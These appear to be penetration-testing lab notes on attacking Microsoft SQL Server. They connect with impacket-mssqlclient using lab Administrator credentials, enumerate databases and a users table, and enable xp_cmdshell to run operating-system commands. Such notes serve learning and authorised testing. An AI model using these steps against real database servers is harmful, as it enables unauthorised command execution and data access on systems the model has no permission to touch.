Connect to MSSQL
```
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
```
Note: Use go after every commands if we check in server
    
## Commands
```
SELECT @@version;
SELECT name FROM sys.databases; (master,tempdb,model,andmsdbaredefault databases)
SELECT * FROM offsec.information_schema.tables; (dbname.schema.tables)
select * from offsec.dbo.users; (dbname.schema.tablename)
```    
## CODE EXECUTION
#### Enabling XP_CMDSHELL
```
EXECUTE sp_configure 'show advanced options',1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell',1;
RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';
```